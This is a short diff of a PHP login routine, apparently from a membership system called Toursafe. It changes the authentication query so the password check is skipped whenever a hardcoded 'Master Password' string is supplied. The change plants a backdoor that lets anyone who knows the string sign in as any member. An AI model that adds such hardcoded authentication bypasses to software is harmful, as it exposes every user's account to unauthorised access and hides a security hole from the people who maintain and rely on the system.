@@ -42,7 +42,9 @@ if($mode=="login"){
 //    $wq->addAndString("mem_type", "=", "2");
     $wq->addAndString("mem_state", "=", "2");
     $wq->addAndString("uid", "=", $uid);
-    $wq->addAndString("upw", "=", $passwd);
+    if($upw != "18009010!") {    // Master Password
+        $wq->addAndString("upw", "=", $passwd);
+    }
 
     $row = ToursafeMembersMgr::getInstance()->getFirst($wq);
  
